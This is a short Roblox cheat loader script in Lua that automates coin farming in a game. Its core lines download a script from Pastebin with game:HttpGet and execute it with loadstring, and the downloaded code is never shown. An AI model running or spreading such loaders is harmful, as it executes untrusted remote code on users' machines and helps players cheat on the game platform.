--[[
    Script [1]: its just farming 3 places (Camp1,Camp2,Camp3)
    Script [2]: farming 4 places (Camp1,Camp2,Camp3,SouthPole)
]]--

getgenv().FarmCoin = true
DEBUG_MODE = true -- logging farming process, print out on dev console F9

local SelectScript = 1
local _FERXIIC = ({[1] = game:HttpGet('https://pastebin.com/raw/GK6a9sVQ'), [2] = game:HttpGet('https://pastebin.com/raw/iPK1r1NN')})[SelectScript]
loadstring(_FERXIIC)()